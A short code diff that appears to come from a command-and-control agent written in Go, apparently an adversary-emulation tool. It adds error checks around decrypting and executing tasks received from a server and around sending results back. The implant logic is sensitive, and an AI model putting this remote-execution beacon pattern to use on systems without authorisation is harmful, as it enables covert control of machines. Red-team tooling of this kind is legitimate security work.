@@ -41,9 +41,10 @@ func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util
 
 func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
 	var tempB util.Beacon
-	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
-	beacon.Links = beacon.Links[:0]
-	runLinks(&tempB, &beacon, agent, "\r\n")
+	if err := json.Unmarshal([]byte(util.Decrypt(message)), &tempB); err == nil {
+		beacon.Links = beacon.Links[:0]
+		runLinks(&tempB, &beacon, agent, "\r\n")
+	}
 	refreshBeacon(agent, &beacon)
 	bufferedSend(conn, beacon)
 }
@@ -57,6 +58,8 @@ func bufferedSend(conn net.Conn, beacon util.Beacon) {
 		if err == io.EOF {
 			return
 		}
-		conn.Write(sendBuffer)
+		if _, err = conn.Write(sendBuffer); err != nil {
+			util.DebugLog(err)
+		}
 	}
 }
